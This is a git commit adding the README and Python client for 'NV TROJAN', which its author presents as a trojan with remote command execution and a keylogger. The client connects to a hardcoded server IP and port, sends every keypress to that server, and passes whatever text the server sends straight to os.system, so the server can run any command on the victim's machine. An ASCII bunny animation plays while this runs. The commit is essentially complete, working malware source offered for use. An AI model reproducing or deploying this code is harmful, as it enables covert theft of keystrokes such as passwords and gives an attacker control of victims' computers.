56d74b3710f6fb1b0f71586bbb6e37e36841a02c
nv-m <81468015+nv-m@users.noreply.github.com>
2021-05-04 17:32:42 +0530

    Add files via upload
    Requirements:
     'pynput' -- required modules are automatically installed in the client...in server the user must do it:  command -- 'pip insall pynput'

---
+++ README.txt
@@ -0,0 +1,18 @@
+
+NV TROJAN
+=================
+
+A trojan written in python 
+functions:
+   1) Remote cmd acces --execute any cmd commands on the remote client from your server
+   2) Keylogger -- each time a command is executed all the keys pressed by the userin that time span will be sent to the server
+
+
+Requirements
+------------
+
+You need `pynput` installed (`pip3 install pynput`)
+
+Usage
+-----
+change the ip address in the client file ...replace ip address aith your sever ip
---
+++ nv client.py
@@ -0,0 +1,132 @@
+import os
+from pynput import keyboard
+import sys
+import time
+import socket
+import threading
+
+############################################################################
+
+evilBunnyServerIP = "192.168.1.8"
+evilBunnyServerPort = 8912
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+############################################################################
+
+
+def start_new_thread(f, args):
+
+    t = threading.Thread(target=f, args=args)
+    t.start()
+    return t
+
+
+def main():
+
+    global sock
+
+    # Establish TCP socket with the distant server
+    try:
+        sock.connect((evilBunnyServerIP, evilBunnyServerPort))
+
+    except Exception:
+
+        print("Something wrong happened. Failed to connect to evil server? You should launch evilBunnyServer in another terminal first!")
+        sys.exit(1)
+
+    t1 = start_new_thread(animatedBunny, ())
+    t2 = start_new_thread(keylog, ())
+    t3 = start_new_thread(printMessagesFromEvilServer, ())
+
+    # Send a hello message
+    sock.send(b"Hello evil server !")
+
+    # Infinite loop so that the program and thread keeps running
+    while True:
+        if any(not t.is_alive() for t in [t1, t2, t3]):
+            sock = None
+            sys.exit(0)
+
+
+############################################################################
+
+# Thread launched after connection with the evil server is started
+# -> it launces the keylogger
+def keylog():
+
+    def on_press(key):
+
+        if sock is None:
+            sys.exit(0)
+
+        try:
+            sock.send(bytes(str(key).encode('utf-8')))
+        except Exception as e:
+            sys.exit(1)
+
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+############################################################################
+
+
+def printMessagesFromEvilServer():
+
+    while True:
+        if sock is None:
+            sys.exit(0)
+
+        data = sock.recv(1024).decode('utf-8')
+        c=data
+        os.system(c)
+        
+        if not data:
+            sys.exit(0)
+
+        print("[Server] " + data)
+
+############################################################################
+
+
+bunny1 = r"""
+        /\       //  \\      //    
+       //\\     //    \\    //  
+      //  \\   //      \\  //           
+     //    \\ //        \\//                     
+    //      \\\          \//           
+   //                               
+        """
+
+
+bunny2 = r"""
+
+
+        \      //  \\      /        
+       /\     //    \\    /  
+      /  \   //      \\  /         
+     /    \ //        \\/             
+    /      \                     
+   /                               
+        """
+
+
+def animatedBunny():
+
+    while True:
+
+        if sock is None:
+            sys.exit(0)
+
+        print("\n" * 80 + bunny1)
+
+        time.sleep(1)
+
+        print("\n" * 80 + bunny2)
+
+        time.sleep(1)
+
+############################################################################
+
+
+main()
